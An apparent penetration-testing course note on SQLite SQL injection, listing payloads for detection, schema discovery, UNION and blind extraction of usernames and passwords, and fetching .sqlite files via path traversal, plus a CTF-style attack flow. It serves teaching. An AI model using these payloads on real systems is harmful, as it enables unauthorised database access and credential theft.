---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.19 SQLite Specific Payloads"
---

# 06.19 — SQLite Specific Payloads

## What is SQLite?

SQLite is a file-based, serverless database. It's embedded directly in applications — used in mobile apps (Android, iOS), desktop apps, small web applications, IoT devices, and some CTF challenges. There's no separate database server process; the app reads/writes directly to a `.sqlite` or `.db` file.

```
WHERE SQLITE IS USED:
  → Android apps (local storage)
  → iOS apps (CoreData uses SQLite)
  → Desktop apps (Firefox profile.db, Electron apps)
  → Small PHP/Python/Node.js web apps
  → CTF challenges (very common!)
  → Embedded systems / IoT
  → Password managers, browsers

IMPLICATION:
  → SQLite file IS the database
  → If you can read the file → all data exposed!
  → No network service to brute-force
  → Injection still works in web context!
```

---

## SQLite Detection

```sql
-- SQLITE-SPECIFIC FUNCTIONS:
SELECT sqlite_version()      -- version string
SELECT typeof(1)             -- 'integer' (SQLite type system)
SELECT random()              -- random integer
SELECT hex('a')              -- '61' (hex encoding)

-- DETECT VIA BEHAVIOR:
-- SQLite has no SLEEP() or BENCHMARK!
-- No information_schema in old SQLite (added in some versions)

-- SQLITE COMMENT STYLE:
-- Single-line: --
-- Inline: /* comment */

-- DETECT VIA UNIQUE FUNCTION:
' AND sqlite_version()>'0'--   → returns version (SQLite specific)
' AND TYPEOF(1)='integer'--    → TYPEOF is SQLite-specific
' AND randomblob(1)='x'--      → RANDOMBLOB function

-- DETECT VIA TIME (slow query instead of SLEEP):
' AND 1=(SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master)--
-- Cross-join causes delay → SQLite detected!
```

---

## SQLite Schema Discovery

SQLite uses `sqlite_master` (or `sqlite_schema` in newer versions) instead of `information_schema`:

```sql
-- LIST ALL TABLES:
SELECT name FROM sqlite_master WHERE type='table'
SELECT name FROM sqlite_schema WHERE type='table'   -- newer versions
SELECT tbl_name FROM sqlite_master WHERE type='table'

-- LIST ALL VIEWS:
SELECT name FROM sqlite_master WHERE type='view'

-- GET COLUMN INFO (via CREATE statement stored in sqlite_master):
SELECT sql FROM sqlite_master WHERE name='users'
-- Returns: CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)
-- → Full table schema in one query!

-- ALL SCHEMA (tables + columns):
SELECT sql FROM sqlite_master WHERE type='table'

-- CHECK IF TABLE EXISTS:
SELECT COUNT(*) FROM sqlite_master WHERE name='users' AND type='table'
```

---

## SQLite Data Extraction

```sql
-- BASIC SELECT:
SELECT * FROM users
SELECT username,password FROM users LIMIT 1
SELECT username,password FROM users LIMIT 1 OFFSET 1

-- CONCAT (SQLite uses ||):
SELECT username || ':' || password FROM users

-- ALL ROWS AS ONE STRING:
SELECT GROUP_CONCAT(username || ':' || password, ',') FROM users

-- PAGINATE:
SELECT username FROM users LIMIT 1 OFFSET 0   -- first user
SELECT username FROM users LIMIT 1 OFFSET 1   -- second user

-- SPECIFIC VALUE:
SELECT password FROM users WHERE username='admin'

-- COALESCE (handle nulls):
SELECT COALESCE(password, 'NULL') FROM users WHERE username='admin'
```

---

## SQLite UNION-Based

```sql
-- FIND COLUMN COUNT:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   → error = 2 columns!

-- UNION (no FROM dual needed in SQLite):
' UNION SELECT NULL,NULL--      → 2 columns, no error
' UNION SELECT 'a','b'--        → find which column is visible

-- EXTRACT VERSION:
' UNION SELECT sqlite_version(),NULL--

-- EXTRACT TABLES:
' UNION SELECT GROUP_CONCAT(name,','),NULL FROM sqlite_master WHERE type='table'--

-- EXTRACT SCHEMA (get CREATE TABLE statement):
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
-- Returns: "CREATE TABLE users (id INTEGER, username TEXT, password TEXT)"

-- EXTRACT DATA:
' UNION SELECT username || ':' || password,NULL FROM users--
' UNION SELECT GROUP_CONCAT(username||':'||password,','),NULL FROM users--
```

---

## SQLite Boolean-Based Blind

```sql
-- BOOLEAN TEST:
' AND 1=1--   → TRUE (normal response)
' AND 1=2--   → FALSE (different response)

-- VERSION CHECK:
' AND SUBSTR(sqlite_version(),1,1)='3'--  → TRUE (SQLite 3.x)

-- TABLE EXISTS:
' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='users')=1--

-- DATA EXTRACTION (char by char):
' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='5'--
' AND UNICODE(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1))>64--

-- LENGTH CHECK:
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32--
-- 32 chars = likely MD5 hash!
```

---

## SQLite Time-Based (Slow Query)

SQLite doesn't have SLEEP()! Use CPU-heavy cross-joins instead:

```sql
-- SLOW QUERY METHOD (cross-join all tables):
' AND 1=(SELECT COUNT(*) FROM sqlite_master AS a, sqlite_master AS b, sqlite_master AS c)--
-- This creates a massive cross-join → slow to execute!

-- CONDITIONAL SLOW QUERY:
' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) ELSE 1 END)=0--
-- TRUE: heavy query (slow)
-- FALSE: returns 1 (fast)

-- DATA EXTRACTION VIA TIMING:
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='5') THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) ELSE 1 END)=0--
-- delay = first char of admin password is '5'!

-- NOTE: Timing is less reliable (depends on number of rows in sqlite_master)
-- Boolean-based is more reliable for SQLite
```

---

## SQLite Special Functions

```sql
-- USEFUL SQLITE FUNCTIONS:
SUBSTR(str, pos, len)    -- substring (1-indexed)
REPLACE(str, from, to)   -- replace in string
TRIM(str)                -- remove whitespace
UPPER(str) / LOWER(str)  -- case conversion
LENGTH(str)              -- string length
HEX(str)                 -- hex encode (useful for WAF bypass)
UNHEX(hex)               -- NOT built in SQLite!
CHAR(65)                 -- character from ASCII code → 'A'
UNICODE('A')             -- ASCII code → 65
RANDOMBLOB(n)            -- random bytes (timing bypass)
CAST(x AS type)          -- type casting
TYPEOF(x)                -- returns type string

-- MATH:
ABS(-5)   → 5
MAX(1,2)  → 2
MIN(1,2)  → 1
ROUND(3.7) → 4

-- NULL HANDLING:
COALESCE(null_col, 'default')
IFNULL(null_col, 'default')
NULLIF(a, b)  -- returns NULL if a=b
```

---

## SQLite File Interaction (Rare in Web Context)

```sql
-- SQLITE DOESN'T HAVE LOAD_FILE OR INTO OUTFILE
-- However, the database IS a file
-- If you can download the .sqlite/.db file via path traversal/LFI:
-- You get the entire database!

-- COMMON SQLITE FILE PATHS TO CHECK (via path traversal/LFI):
/var/www/html/database.sqlite
/var/www/html/db.sqlite3
/var/www/html/storage/database.sqlite   -- Laravel
/var/www/html/app.db
/path/to/app/users.db

-- IF YOU FIND THE FILE:
wget https://target.com/../database.sqlite
sqlite3 database.sqlite
.tables
.schema users
SELECT * FROM users;
```

---

## SQLite CTF-Style Payloads

SQLite is very common in CTF challenges. Here's a quick cheatsheet for CTF context:

```bash
# QUICK RECON:
# Check tables:
?id=1 UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'--

# Get schema:
?id=1 UNION SELECT sql,NULL FROM sqlite_master WHERE name='secret_table'--

# Get data:
?id=1 UNION SELECT GROUP_CONCAT(flag_column,','),NULL FROM flag_table--

# TYPICAL CTF FLOW:
?id=1'                                                     # 1. Detect (error)
?id=1 ORDER BY 2--                                         # 2. Count columns = 2
?id=1 UNION SELECT 'a','b'--                               # 3. Find visible columns
?id=1 UNION SELECT sqlite_version(),'b'--                  # 4. Version
?id=1 UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'-- # 5. Tables
?id=1 UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- # 6. Schema
?id=1 UNION SELECT GROUP_CONCAT(username||':'||password),NULL FROM users-- # 7. Data!
```

---

## SQLite Cheat Sheet Summary

```
DETECTION:   sqlite_version(), typeof(1), slow cross-join
SCHEMA:      SELECT name FROM sqlite_master WHERE type='table'
COLUMNS:     SELECT sql FROM sqlite_master WHERE name='tablename' (gets CREATE statement!)
DATA:        SELECT username||':'||password FROM users
AGGREGATION: GROUP_CONCAT(col, ',') FROM table
UNION:       UNION SELECT NULL,NULL-- (no FROM dual!)
BOOLEAN:     AND SUBSTR(sqlite_version(),1,1)='3'
TIME:        SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master (heavy query)
FILE:        No LOAD_FILE - but look for .sqlite file via LFI/path traversal!
NO STACKED:  SQLite typically doesn't allow multiple statements
```

---

## Related Notes
- [[15 - MySQL Specific Payloads]] — MySQL comparison
- [[04 - Union-Based SQLi]] — UNION technique details
- [[05 - Blind SQLi Boolean-Based]] — boolean extraction
- [[Module 06 - SQL Injection]] — parent module
